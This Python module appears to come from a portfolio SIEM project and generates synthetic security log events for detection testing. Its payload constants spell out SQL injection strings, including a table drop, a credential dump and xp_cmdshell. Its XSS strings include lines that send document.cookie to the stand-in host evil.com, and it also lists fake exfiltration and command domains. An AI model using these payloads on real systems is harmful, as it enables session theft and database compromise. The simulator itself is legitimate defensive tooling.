"""Realistic security log event simulator.

Generates synthetic but realistic log events that mimic actual attack
patterns a SOC analyst would encounter. Each attack type uses known
real-world techniques:

- SSH Brute Force: rapid login attempts from single IP
- SQL Injection: malicious SQL in query parameters
- Port Scan: sequential probing of many ports
- XSS Attempt: script injection in web requests
- DNS Exfiltration: data hidden in DNS subdomain queries
- Normal traffic: baseline benign web requests

Why do we need this?
In a real SIEM, you'd connect to Syslog, CloudTrail, or a SIEM agent.
For a portfolio project, a simulator lets us demonstrate the full
pipeline without real infrastructure.
"""

from __future__ import annotations

import random
from datetime import UTC, datetime
from typing import TYPE_CHECKING

from sentinel.core.schemas import EventType, LogEvent

if TYPE_CHECKING:
    from collections.abc import Callable

# --- Realistic attack payloads ---

_SQLI_PAYLOADS: list[str] = [
    "' OR '1'='1' --",
    "'; DROP TABLE users; --",
    "' UNION SELECT username, password FROM users --",
    "1' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables)) --",
    "admin'--",
    "' OR 1=1#",
    "1; EXEC xp_cmdshell('whoami') --",
]

_XSS_PAYLOADS: list[str] = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg/onload=fetch('https://evil.com/steal?c='+document.cookie)>",
    "javascript:alert(1)",
    "<iframe src='javascript:alert(1)'>",
    "'\"><script>document.location='https://evil.com/log?c='+document.cookie</script>",
]

_USER_AGENTS: list[str] = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
    "curl/7.88.1",
    "python-requests/2.31.0",
    "Nmap Scripting Engine",
    "sqlmap/1.7.2#stable",
    "Nikto/2.5.0",
    "Hydra/9.5",
]

_WEB_PATHS: list[str] = [
    "/",
    "/api/v1/users",
    "/api/v1/login",
    "/api/v1/products",
    "/admin/dashboard",
    "/api/v1/search",
    "/static/style.css",
    "/health",
    "/api/v1/orders",
    "/api/v1/profile",
]

_DNS_EXFIL_DOMAINS: list[str] = [
    "c2.evil-server.xyz",
    "data.exfil-tunnel.net",
    "cmd.backdoor-relay.io",
]


def _random_internal_ip() -> str:
    """Generate a random internal (RFC 1918) IP address."""
    return f"10.0.{random.randint(1, 254)}.{random.randint(1, 254)}"


def _random_external_ip() -> str:
    """Generate a random external IP address (for attackers)."""
    octets = [
        random.randint(45, 200),
        random.randint(1, 254),
        random.randint(1, 254),
        random.randint(1, 254),
    ]
    return ".".join(str(o) for o in octets)


def _generate_ssh_brute_force() -> LogEvent:
    """Simulate SSH brute force: many rapid login attempts from one IP."""
    attacker_ip = _random_external_ip()
    return LogEvent(
        src_ip=attacker_ip,
        dst_ip=_random_internal_ip(),
        src_port=random.randint(40000, 65535),
        dst_port=22,
        protocol="TCP",
        event_type=EventType.SSH_BRUTE_FORCE,
        payload=(
            f"Failed password for root from {attacker_ip} port {random.randint(40000, 65535)} ssh2"
        ),
        user_agent="OpenSSH_8.9",
        response_status=401,
        bytes_sent=random.randint(200, 500),
        metadata={"auth_attempts": random.randint(50, 500)},
    )


def _generate_sqli_attempt() -> LogEvent:
    """Simulate SQL injection: malicious SQL in request parameters."""
    payload = random.choice(_SQLI_PAYLOADS)
    path = random.choice(["/api/v1/login", "/api/v1/search", "/api/v1/users"])
    return LogEvent(
        src_ip=_random_external_ip(),
        dst_ip=_random_internal_ip(),
        src_port=random.randint(40000, 65535),
        dst_port=443,
        protocol="TCP",
        event_type=EventType.SQLI_ATTEMPT,
        payload=payload,
        user_agent=random.choice(["sqlmap/1.7.2#stable", "python-requests/2.31.0"]),
        request_path=f"{path}?id={payload}",
        request_method="POST",
        response_status=random.choice([200, 500]),
        bytes_sent=random.randint(500, 5000),
    )


def _generate_port_scan() -> LogEvent:
    """Simulate port scan: sequential probing of many ports from one IP."""
    return LogEvent(
        src_ip=_random_external_ip(),
        dst_ip=_random_internal_ip(),
        src_port=random.randint(40000, 65535),
        dst_port=random.choice(
            [21, 22, 23, 25, 53, 80, 110, 139, 443, 445, 3306, 3389, 5432, 8080]
        ),
        protocol="TCP",
        event_type=EventType.PORT_SCAN,
        payload="SYN packet — no payload",
        user_agent="Nmap Scripting Engine",
        response_status=0,
        bytes_sent=0,
        metadata={"scan_type": random.choice(["SYN", "FIN", "XMAS", "NULL"])},
    )


def _generate_xss_attempt() -> LogEvent:
    """Simulate XSS: script injection in web request parameters."""
    payload = random.choice(_XSS_PAYLOADS)
    return LogEvent(
        src_ip=_random_external_ip(),
        dst_ip=_random_internal_ip(),
        src_port=random.randint(40000, 65535),
        dst_port=443,
        protocol="TCP",
        event_type=EventType.XSS_ATTEMPT,
        payload=payload,
        user_agent=random.choice(_USER_AGENTS[:4]),
        request_path=f"/api/v1/search?q={payload}",
        request_method="GET",
        response_status=200,
        bytes_sent=random.randint(1000, 8000),
    )


def _generate_dns_exfiltration() -> LogEvent:
    """Simulate DNS exfiltration: data encoded in subdomain queries."""
    # Attackers encode stolen data as hex subdomains
    hex_data = "".join(random.choices("0123456789abcdef", k=random.randint(20, 60)))
    domain = random.choice(_DNS_EXFIL_DOMAINS)
    return LogEvent(
        src_ip=_random_internal_ip(),
        dst_ip="8.8.8.8",
        src_port=random.randint(40000, 65535),
        dst_port=53,
        protocol="UDP",
        event_type=EventType.DNS_EXFILTRATION,
        payload=f"DNS TXT query: {hex_data}.{domain}",
        bytes_sent=random.randint(100, 300),
        metadata={"query_length": len(hex_data), "domain": domain},
    )


def _generate_normal_traffic() -> LogEvent:
    """Simulate normal web traffic: typical user browsing behavior."""
    now = datetime.now(tz=UTC)
    return LogEvent(
        timestamp=now,
        src_ip=_random_internal_ip(),
        dst_ip=_random_internal_ip(),
        src_port=random.randint(40000, 65535),
        dst_port=random.choice([80, 443]),
        protocol="TCP",
        event_type=EventType.NORMAL,
        payload="",
        user_agent=random.choice(_USER_AGENTS[:4]),
        request_path=random.choice(_WEB_PATHS),
        request_method=random.choice(["GET", "GET", "GET", "POST"]),
        response_status=random.choice([200, 200, 200, 200, 301, 304, 404]),
        bytes_sent=random.randint(500, 50000),
    )


# Map each event type to its generator
_GENERATORS: dict[EventType, Callable[[], LogEvent]] = {
    EventType.SSH_BRUTE_FORCE: _generate_ssh_brute_force,
    EventType.SQLI_ATTEMPT: _generate_sqli_attempt,
    EventType.PORT_SCAN: _generate_port_scan,
    EventType.XSS_ATTEMPT: _generate_xss_attempt,
    EventType.DNS_EXFILTRATION: _generate_dns_exfiltration,
    EventType.NORMAL: _generate_normal_traffic,
}


def generate_event(event_type: EventType | None = None) -> LogEvent:
    """Generate a single log event.

    Args:
        event_type: Specific type to generate. If None, randomly selects
                    with 70% normal traffic / 30% attack events.
    """
    if event_type is not None:
        return _GENERATORS[event_type]()

    # Realistic distribution: most traffic is normal
    if random.random() < 0.7:
        return _generate_normal_traffic()

    attack_type = random.choice(
        [
            EventType.SSH_BRUTE_FORCE,
            EventType.SQLI_ATTEMPT,
            EventType.PORT_SCAN,
            EventType.XSS_ATTEMPT,
            EventType.DNS_EXFILTRATION,
        ]
    )
    return _GENERATORS[attack_type]()


def generate_batch(count: int = 100, attack_ratio: float = 0.3) -> list[LogEvent]:
    """Generate a batch of log events with a specified attack ratio.

    Args:
        count: Total number of events to generate.
        attack_ratio: Fraction of events that are attacks (0.0 to 1.0).
    """
    attack_types = [
        EventType.SSH_BRUTE_FORCE,
        EventType.SQLI_ATTEMPT,
        EventType.PORT_SCAN,
        EventType.XSS_ATTEMPT,
        EventType.DNS_EXFILTRATION,
    ]

    events: list[LogEvent] = []
    num_attacks = int(count * attack_ratio)

    for _ in range(num_attacks):
        events.append(generate_event(random.choice(attack_types)))

    for _ in range(count - num_attacks):
        events.append(generate_event(EventType.NORMAL))

    random.shuffle(events)
    return events
